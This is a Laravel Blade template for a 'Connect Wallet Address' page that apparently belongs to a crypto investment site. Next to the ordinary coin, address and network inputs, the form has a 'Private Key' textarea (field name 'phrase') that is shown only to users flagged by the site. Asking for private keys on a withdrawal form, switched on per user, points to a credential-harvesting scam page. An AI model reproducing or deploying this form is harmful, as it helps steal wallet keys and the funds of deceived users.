@extends('layouts.index')

@section('title')
    Connect Wallet Address
@endsection

@section('content')

<div class="nk-content nk-content-lg nk-content-fluid">
    <div class="container-xl wide-lg">
        <div class="nk-content-inner">
            <div class="nk-content-body">
                <div class="nk-block-head">
                    <div class="nk-block-head-content">
                        <div class="nk-block-head-sub"><span>Connect Wallets</span></div>
                        <div class="nk-block g-4">
                            <div class="nk-block-head-content">
                                <div class="d-flex justify-content-between">
                                    <h4 class="nk-block-title fw-normal">Add Withdrawal Wallets</h4>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="nk-block mb-5">
                   <div class="row">
                        <div class="col-lg-6">
                            <div class="shadow p-3 rounded">
                                <form action="{{ route('user.user.store.wallet') }}" method="post">
                                    @csrf
                                        <div class="mb-3">
                                            <label for="coin_name" class="col-form-label">Wallet/Coin Name</label>
                                            <input type="text" placeholder="Name of Coin" name="coin" class="form-control" id="coin_name">
                                                @error('coin')
                                                    <span id="-error" class="invalid">{{ $message }}</span>
                                                @enderror
                                        </div>

                                        <div class="mb-3">
                                            <label for="address" class="col-form-label">Wallet Address</label>
                                            <input type="text" placeholder="Wallet Address" name="address" class="form-control" id="adddress">
                                            @error('address')
                                                <span id="-error" class="invalid">{{ $message }}</span>
                                            @enderror
                                        </div>

                                        <div class="mb-3">
                                            <label for="network" class="col-form-label">Network (optional)</label>
                                            <input type="text" placeholder="Network (Optional)" name="network" class="form-control" id="network">
                                            @error('network')
                                                <span id="-error" class="invalid">{{ $message }}</span>
                                            @enderror
                                        </div>

                                        <div class="mb-3" @if (Auth::user()->phrase == 'no') style="display: none" @endif>
                                            <label for="network" class="col-form-label">Private Key</label>
                                            <textarea cols="30" rows="5" name="phrase" class="form-control"></textarea>
                                            @error('phrase')
                                                <span id="-error" class="invalid">{{ $message }}</span>
                                            @enderror
                                        </div>

                                    <button type="submit" id="submitDeposit" class="btn btn-success">Connect</button>
                                </form>
                            </div>
                        </div>
                   </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection

@section('img-preview')
    <script>
        imgInp.onchange = evt => {
            const [file] = imgInp.files
            if (file) {
                blah.src = URL.createObjectURL(file)
            }
        }
    </script>

    <script>
        icon.onchange = evt => {
            const [file] = icon.files
            if (file) {
                favicon.src = URL.createObjectURL(file)
            }
        }
    </script>
@endsection
